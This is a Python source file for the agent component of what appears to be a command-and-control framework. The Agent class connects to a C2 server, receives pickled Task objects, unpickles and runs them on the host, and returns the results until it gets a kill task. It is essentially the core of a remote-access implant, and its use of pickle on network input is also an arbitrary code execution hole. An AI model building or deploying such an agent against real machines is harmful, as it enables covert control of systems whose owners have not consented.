#! /usr/bin/python

"""
An Agent is the entity which is actually responsible for performing actions
on the target host. It uses an Executor to execute payloads on the host,
managing communications to and from the C2 server using a
TCPcommunicator.

Since payloads are represented by Task objects, they are pickled
by the C2 server prior to transmission to the Agent, and unpickled
when received by the Agent.

>>> import pickle
>>> from socket import *
>>> from tasklist import Tasklist
>>> from kill import Kill
>>> server_address = '127.0.0.1'
>>> server_port = 5005
>>> BUF_SIZE = 1024
>>> server = socket(AF_INET, SOCK_STREAM, 0)
>>> server.bind((server_address, server_port))
>>> server.listen(1)
>>> agent = Agent(server_address, server_port)
>>> (connection, address) = server.accept()
>>> tasklist = Tasklist()
>>> data = pickle.dumps(tasklist)
>>> connection.sendall(data)
>>> agent.execute() # This now runs forever, so we never get to check output!!
>>> result = connection.recv(BUF_SIZE)
>>> print(result)
>>> connection.close()
>>> server.close()

"""

from task import Task
from TCPcommunicator import TCPcommunicator
import pickle


class Agent:

    def __init__(self, address, port):
        """
            Initialises the Agent with the IP address
            and port on which the C2 server is listening.
        """

        # Initialise communications with the C2 server
        self.__communicator = TCPcommunicator(address, port)

    def __execute_task(self, buffer):
        """
            Reconstructs the pickled Task object that is
            held in the specified buffer, executes the task,
            and returns the string result from the task.
        """

        task = pickle.loads(buffer)
        assert isinstance(task, Task)
        result = task.run()

        return result

    def execute(self):
        """
            Continuously wait for an accept tasking from
            the C2 server, and transmit back the results.
        """

        __stopped = False
        while not __stopped:

            # Receive tasking, which will be a
            # pickled Task object
            data = self.__communicator.receive()

            # Execute the pickled Task, if one has
            # been received
            if data:
                result = self.__execute_task(data)

                # Check if we have been asked to terminate
                if result == "killed":
                    __stopped = True

                # Return the resulting string to
                # the C2 server
                self.__communicator.send(result.encode())

